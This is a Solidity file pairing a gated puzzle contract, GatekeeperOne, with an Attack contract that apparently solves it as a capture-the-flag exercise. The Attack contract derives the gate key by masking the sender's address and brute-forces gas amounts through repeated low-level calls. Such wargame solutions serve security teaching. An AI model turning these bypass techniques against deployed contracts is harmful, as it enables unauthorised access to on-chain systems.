// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Attack {
    address public gatekeeperOne;

    event SuccessOn(uint256 n);

    constructor(address _gatekeeperOne) {
        gatekeeperOne = _gatekeeperOne;
    }

    function attack(uint start) public {
        bytes8 gateKey = bytes8(uint64(uint160(msg.sender))) &
            0xFFFFFFFF0000FFFF;

        for (uint i = start; i < start + 100; i++) {
            (bool success, ) = gatekeeperOne.call{gas: 8191 * 5 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                emit SuccessOn(i);
                return;
            }
        }

        revert();
    }
}
